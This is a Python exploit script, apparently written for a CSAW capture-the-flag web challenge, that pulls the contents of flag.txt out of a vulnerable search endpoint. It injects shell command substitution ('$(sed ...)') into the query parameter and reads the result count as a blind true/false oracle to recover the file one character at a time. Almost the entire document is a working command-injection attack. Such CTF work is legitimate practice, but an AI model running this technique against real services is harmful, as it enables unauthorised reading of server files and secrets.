#!/usr/bin/env python3
"""Blind-extract flag.txt via command-substitution + fixed-string search oracle.

Server: q = f"...{q}..." then matches lines of a log that CONTAIN q (case-insensitive,
fixed string).  We inject $(sed ...) whose output is either the known-good token
"Reactor" (=> 2 hits) or empty (=> 29 hits).
"""
import urllib.parse, urllib.request, json, string, sys, time

BASE = "http://web.chal.csaw.io:3700/vault/search?q="
ALL = 29
HIT = 2

def q(s, timeout=30):
    url = BASE + urllib.parse.quote(s)
    for attempt in range(4):
        try:
            with urllib.request.urlopen(url, timeout=timeout) as r:
                return json.loads(r.read().decode())
        except urllib.error.HTTPError as e:
            try:
                return json.loads(e.read().decode())
            except Exception:
                pass
        except Exception:
            pass
        time.sleep(0.5)
    return {"exc": "failed"}

def n(s):
    r = q(s)
    if "results" in r:
        return len(r["results"])
    return r

def oracle(sed_expr):
    """True if sed prints something (we map it to Reactor)."""
    out = n("$(sed -n %s flag.txt)" % sed_expr)
    if out == HIT:
        return True
    if out == ALL:
        return False
    raise RuntimeError("unexpected oracle result: %r for %r" % (out, sed_expr))

ALPHABET = string.ascii_lowercase + string.digits + "_{}-"

def extract():
    flag = ""
    # sanity
    assert oracle("s/^csawctf.*/Reactor/p"), "prefix check failed"
    while True:
        found = None
        for ch in ALPHABET:
            expr = "s/^%s%s.*/Reactor/p" % (flag, ch)
            if oracle(expr):
                found = ch
                break
        if found is None:
            print("[-] no char found after", flag)
            break
        flag += found
        print("[+]", flag, flush=True)
        if found == "}":
            break
    return flag

if __name__ == "__main__":
    f = extract()
    print("FLAG:", f)

